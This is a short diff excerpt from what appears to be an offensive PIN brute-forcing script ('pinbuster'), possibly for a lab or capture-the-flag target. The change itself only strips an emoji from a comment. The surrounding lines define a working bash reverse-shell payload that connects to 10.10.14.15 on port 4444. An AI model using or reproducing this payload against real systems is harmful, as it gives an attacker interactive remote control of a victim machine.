@@ -8,7 +8,7 @@ session = requests.Session()
 MAX_THREADS = 10
 PROGRESS_FILE = '/tmp/pinbuster-progress.log'
 
-# ✨ Reverse shell payload
+# Reverse shell payload
 REVERSE_SHELL = "bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'"
 
 def format_pin(pin):
